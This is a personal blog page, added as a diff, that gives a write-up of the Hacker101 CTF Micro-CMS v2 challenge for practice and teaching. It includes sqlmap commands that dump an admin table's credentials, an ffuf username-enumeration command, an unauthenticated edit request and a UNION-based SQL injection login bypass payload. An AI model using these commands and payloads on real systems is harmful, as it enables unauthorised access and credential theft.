@@ -1,0 +1,99 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<title>HackerOne Hacker101 CTF Micro-CMS v2 Writeup :: Dustin Dikes</title>
+        <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+		<link rel="stylesheet" href="/assets/style.css" />
+		<link rel="alternate" type="application/rss+xml" href="/index.xml" title="RSS Feed" />
+	</head>
+	<body>
+        <header>
+            <a href="/">Dustin Dikes</a>
+            <nav>
+                <ul>
+                    <li><a href="/about.html">About</a></li>
+                    <li><a href="/resume.html">Resume</a></li>
+		                <li><a href="/blog" class="active">Blog</a></li>
+		                <li><a href="/weeknotes">Week Notes</a></li>
+		                <li><a href="/feeds.html">Feeds</a></li>
+                </ul>
+            </nav>
+        </header>
+<article id="hackerone_hacker101_ctf_micro-cms_v2_writeup"><h1>HackerOne Hacker101 CTF Micro-CMS v2 Writeup</h1><p id="pubdate"><em>Date Published: 2026-06-17</em></p><ul>
+<li>Difficulty: Moderate</li>
+<li>Skills: Web</li>
+<li>Flags: 3</li>
+</ul>
+<p><em>Note: I have no way of knowing what order these flags are in, so these are not in order of the flags on the CTF. I note at the end of each flag which one it actually is.</em></p>
+<p>This target apperas to be a modified version of the Micro-CMS v1 web application. It consists of a list of notes, and a link to create a new one. You can also edit the notes and they support markdown.</p>
+<p>There is a changelog note that mentions how they fixed security issues from the v1 version and added user authentication for adding/editing notes:</p>
+<blockquote>
+<p>This version fixed the multitude of security flaws and general functionality bugs that plagued v1. Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20. By default, users need to be an admin to add or edit pages now.</p>
+</blockquote>
+<p>My first thought was that the login may have a SQL injection bug. Adding <code>' or 1=1;--</code> for the username does change the error from <strong>Unknown user</strong> to <strong>Invalid Password</strong>, however no combination of values got me past invalid password. Trying common things like <strong>admin/admin</strong>  and <strong>administrator/administrator</strong> also didn't work and confirmed that those are invalid usernames.</p>
+<p>Once again we have a URL that returns a forbidden error vs a not found error: <code>/page/3</code></p>
+<p>I tried enumerating usernames with a couple of seclists using ffuf, but had no luck:</p>
+<pre><code>ffuf -u 'https://7ed264e9f9d8dc62f09e3f68ef01e68e.ctf.hacker101.com/login' -X POST -d 'username=FUZZ&amp;password=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 451 -w /usr/share/seclists/Usernames/Names/names.txt
+</code></pre>
+<h2>Flag 1</h2>
+<p>I decided to try using sqlmap to check for a sql injection in the username field, and it seems it has one! It's a time-based blind injection, so it was fairly slow, but running the following gave me a list of database names:</p>
+<pre><code>sqlmap -u &quot;https://7ed264e9f9d8dc62f09e3f68ef01e68e.ctf.hacker101.com/login&quot; --data &quot;username=?&amp;password=pass&quot; --dbs
+</code></pre>
+<p>These are the databases:</p>
+<pre><code>information_schema
+mysql
+performance_schema
+level2
+</code></pre>
+<p>I then grabbed a list of tables for the <code>level2</code> database with the following:</p>
+<pre><code>sqlmap -u &quot;https://7ed264e9f9d8dc62f09e3f68ef01e68e.ctf.hacker101.com/login&quot; --data &quot;username=?&amp;password=pass&quot; -D level2 --tables
+</code></pre>
+<p>These are the tables:</p>
+<pre><code>pages
+admins
+</code></pre>
+<p>I then switched to targeting the <code>admins</code> table and getting it's columns:</p>
+<pre><code>sqlmap -u &quot;https://7ed264e9f9d8dc62f09e3f68ef01e68e.ctf.hacker101.com/login&quot; --data &quot;username=?&amp;password=pass&quot; -D level2 -T admins --columns
+</code></pre>
+<p>These are the columns for <code>admins</code>:</p>
+<pre><code>id int(11)
+username varchar(256)
+password varchar(256)
+</code></pre>
+<p>I stopped it at this point, because I wanted to try to dump the username and password fields specifically</p>
+<pre><code>sqlmap -u &quot;https://7ed264e9f9d8dc62f09e3f68ef01e68e.ctf.hacker101.com/login&quot; --data &quot;username=?&amp;password=pass&quot; -D level2 -T admins -C &quot;username,password&quot; --dump
+</code></pre>
+<p>I got the following:</p>
+<pre><code>Username: marvella
+Password: stasia
+</code></pre>
+<p>An unencrypted password, perfect! Logging in as that user displays a flag on the page:</p>
+<p><img alt="" src="/assets/img/hacker101-microcmsv2-001.png" /></p>
+<p>Turns out this flag is the last one, Flag2.</p>
+<h2>Flag 2</h2>
+<p>For this flag I decided to try to edit a post without being logged in my changing the method to POST and adding the body structure that was used in the previous version. When you do that, it responds with the flag:</p>
+<pre><code>POST /page/edit/2
+title=Test&amp;body=Test
+</code></pre>
+<p><img alt="" src="/assets/img/hacker101-microcmsv2-002.png" /></p>
+<p>This was the second flag, Flag1.</p>
+<h2>Flag 3</h2>
+<p>The hint for this one was to use a UNION. I will be honest, I am pretty rusty with UNIONs, so I looked up some examples of how you can do this. In the end, this was the payload that worked:</p>
+<pre><code>username=admin' UNION SELECT 'test' AS password FROM admins WHERE '1'='1&amp;password=test
+</code></pre>
+<p>This works because when the user is pulled from the database, instead of getting the actual information, it selects the union values where we can set the password ourselves. Then you just pass that password as part of the request, and it lets you in!</p>
+<p>When logged in you can view the private page, which displays the flag:</p>
+<p><img alt="" src="/assets/img/hacker101-microcmsv2-003.png" /></p>
+<p>Turns out I did these in reverse order, this one is Flag0.</p></article>        <footer>
+            <ul id="social">
+                <li><a href="https://infosec.exchange/@dustin_dikes" rel="me" target="_blank"><img src="/assets/img/mastodon.svg" alt="Mastodon" /></a></li>
+                <li><a href="https://github.com/dustindikes" target="_blank"><img src="/assets/img/github.svg" alt="Github" /></a></li>
+                <li><a href="https://www.linkedin.com/in/dustindikes" target="_blank"><img src="/assets/img/linkedin.svg" alt="LinkedIn" /></a></li>
+                <li><a href="mailto:dustindikes@protonmail.com"><img src="/assets/img/email.svg" alt="Email" /></a></li>
+            </ul>
+        </footer>
+	</body>
+</html>
